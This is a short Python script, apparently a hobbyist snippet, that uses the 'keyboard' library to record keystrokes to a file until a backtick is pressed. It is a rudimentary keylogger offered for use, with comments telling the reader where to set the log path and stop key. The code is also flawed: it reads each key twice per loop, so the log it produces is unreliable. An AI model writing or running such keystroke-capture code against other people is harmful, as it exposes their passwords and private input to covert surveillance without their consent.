import keyboard#!pip3 install keyboard  
logger = open(r"", "a")#put location of the file you want to write to.
while True:
    logger.write(keyboard.read_key())
    if keyboard.read_key() == "`":#change the key to something else if you want
        break

logger.close()
